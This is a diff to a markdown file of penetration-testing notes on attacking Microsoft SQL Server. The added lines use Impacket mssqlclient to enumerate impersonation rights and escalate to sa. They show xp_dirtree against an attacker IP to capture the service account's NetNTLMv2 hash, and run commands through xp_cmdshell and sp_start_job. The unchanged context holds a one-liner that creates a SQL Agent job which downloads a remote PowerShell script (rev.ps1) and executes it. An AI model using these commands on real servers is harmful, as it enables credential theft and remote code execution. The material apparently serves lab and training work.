@@ -12,13 +12,45 @@ SELECT SYSTEM_USER
 
 > Note: The sa login is disabled by default when Windows Authentication Mode is selected during installation
 
+
+
+---
+## Enumeration using mssqlclient 
+```sql
+enum_impersonate
+
+-- then privesc
+exec_as_login sa
+SQL (sa dbo@master)> SELECT SYSTEM_USER;
+--
+sa
+
+
+-- And we can use xp_dirtree command to steal the service's NetNTLMv2 hash:
+SQL (ws_dev guest@master)> xp_dirtree \\10.10.14.104\a
+subdirectory depth file
+```
+
+## Command Execution via mssqlclient
+Impacket MSSQLClient has built-in methods which can be used to execute commands via `xp_cmdshell` using the `enable_xp_cmdshell` , `xp_cmdshell` and `disable_xp_cmdshell` commands.
+
+Additionally, the `sp_start_job` command may be used to (blindly) achieve code execution using MSSQL Server Agent Jobs .
+
+```sql
+SQL (sa dbo@master)> sp_start_job cmd.exe /c "whoami >
+C:\Windows\Tasks\tmp.txt"
+
+[*] INFO(SQL01): Line 96: Job 'IdxDefrag2A8E83E4-0180-458A-8291-
+66FB5E862F2A' started successfully.
+```
+
 ---
 
 ## PrivEsc
 
 ### Impersonating Logins
 
-MSSQL Server has a statement called EXECUTE AS which allows a login (or user) to switch the execution context of a session to another login (or user), essentially impersonating them until the context switch is explicitly switched back with the REVERT statement.
+MSSQL Server has a statement called EXECUTE AS which allows a login (or user) to switch the execution context of a session to another login (or user), essentially impersonating them until the context switch is explicitly switched back with the `REVERT` statement.
 
 Which logins are allowed to impersonate which other logins is controlled by server-level IMPERSONATE permissions, stored in the sys.server_permissions table. We can enumerate all the logins our current login is allowed to impersonate with the following T-SQL query:
 ```powershell
@@ -115,3 +147,4 @@ one liner:
 ```shell
 USE msdb; EXEC sp_add_job @job_name = N'Malicious Job'; EXEC sp_add_jobstep @job_name = N'Malicious Job', @step_name = N'Execute PowerShell Script', @subsystem = N'PowerShell', @command = N'(New-Object Net.WebClient).DownloadString("http://192.168.56.1/rev.ps1")|IEX;', @retry_attempts = 5, @retry_interval = 5; EXEC sp_add_jobserver @job_name = N'Malicious Job'; EXEC sp_start_job @job_name = N'Malicious Job';
 ```
+
